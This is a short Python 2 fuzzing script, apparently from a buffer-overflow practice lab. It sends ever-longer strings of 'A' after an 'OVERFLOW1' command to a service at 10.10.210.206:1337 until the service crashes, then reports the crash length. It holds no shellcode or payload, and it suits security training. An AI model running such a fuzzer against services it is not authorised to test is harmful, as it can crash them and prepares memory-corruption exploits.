#!/usr/bin/python 
import sys, socket
from time import sleep

buffer = 'A' * 100

while True:

	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.10.210.206',1337))

		s.send(('OVERFLOW1 ' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A" *100

	except:
		print "fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()